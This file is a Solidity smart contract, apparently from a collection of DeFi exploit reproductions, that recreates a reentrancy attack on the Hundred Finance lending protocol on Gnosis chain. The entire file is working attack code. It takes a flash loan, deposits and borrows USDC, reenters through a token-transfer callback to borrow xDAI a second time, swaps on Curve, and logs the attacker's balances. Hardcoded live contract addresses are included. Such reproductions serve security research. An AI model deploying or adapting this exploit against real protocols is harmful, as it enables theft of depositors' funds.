pragma solidity ^0.8.0;

import "../src/flashloan/FlashLoan.sol";
import "../src/reentrancy/Reentrancy.sol";
import "../src/tokens/Tokens.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "forge-std/console.sol";

contract HundredFinanceHack is FlashLoan, Reentrancy {
    IERC20 constant husd = IERC20(0x243E33aa7f6787154a8E59d3C27a66db3F8818ee);
    IERC20 constant hxdai = IERC20(0x090a00A2De0EA83DEf700B5e216f87a5D4F394FE);
    IERC20 constant wxdai = IERC20(0xe91D153E0b41518A2Ce8Dd3D7944Fa863463a97d);
    ICurve constant curve = ICurve(0x7f90122BF0700F9E7e1F688fe926940E8839F353);
    bool borrowedXdai;
    uint256 totalFlashloaned;

    function initiateAttack() external {
        console.log("USDC balance before:", GnosisTokens.USDC.balanceOf(address(this)));
        address[] memory tokens = new address[](2);
        tokens[0] = address(GnosisTokens.USDC);
        tokens[1] = address(wxdai);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 2117765617657;
        amounts[1] = 0;
        takeFlashLoan(FlashLoanProviders.UNISWAPV2, tokens, amounts);
        console.log("USDC balance after:", GnosisTokens.USDC.balanceOf(address(this)));
    }

    function _executeAttack() internal override(FlashLoan, Reentrancy) {
        if (msg.sig == this.onTokenTransfer.selector) {
            (address from,,) = abi.decode(msg.data[4:], (address, uint256, bytes));
            // Borrowed usdc, reenter contract and borrow hxdai tokens
            if (from == address(husd) && !borrowedXdai) {
                borrowedXdai = true;
                uint256 amount = (totalFlashloaned * 1e12) * 60 / 100;

                ICompoundToken(address(hxdai)).borrow(amount);
            }
        } else if (currentFlashLoanProvider() == FlashLoanProviders.UNISWAPV2) {
            console.log("USDC balance after flash loan:", GnosisTokens.USDC.balanceOf(address(this)));

            (, uint256 amount0, uint256 amount1,) = abi.decode(msg.data[4:], (address, uint256, uint256, bytes));
            totalFlashloaned = amount0 == 0 ? amount1 : amount0;

            // Deposit usdc to Hundred Finance
            uint256 balance = GnosisTokens.USDC.balanceOf(address(this));
            GnosisTokens.USDC.approve(address(husd), balance);
            ICompoundToken(address(husd)).mint(balance);

            // Borrow usdc
            uint256 amount = (totalFlashloaned * 90) / 100;
            ICompoundToken(address(husd)).borrow(amount);

            console.log("Attacker USDC balance after borrow: %s USDC", GnosisTokens.USDC.balanceOf(address(this)));
            console.log("Attacker xdai balance after borrow: %s XDAI", address(this).balance);
        }
    }

    function _completeAttack() internal override(FlashLoan, Reentrancy) {
        // Swap xdai to repay flash loan
        IWETH(payable(address(wxdai))).deposit{value: address(this).balance}();
        wxdai.approve(address(curve), wxdai.balanceOf(address(this)));
        curve.exchange(0, 1, wxdai.balanceOf(address(this)), 1);
        console.log("Attacker USDC balance after swap: %s USDC", GnosisTokens.USDC.balanceOf(address(this)));
        console.log("Attacker xdai balance after swap: %s XDAI", address(this).balance);
    }

    receive() external payable override {}

    function _reentrancyCallback() internal override {
        _executeAttack();
    }

    fallback() external payable override(FlashLoan, Reentrancy) {
        FlashLoan._fallback();
    }
}

interface ICompoundToken {
    function borrow(uint256) external;
    function mint(uint256) external;
    function comptroller() external view returns (address);
}

interface IWETH {
    function deposit() external payable;
}

interface ICurve {
    function exchange(int128 i, int128 j, uint256 _dx, uint256 _min_dy) external;
}
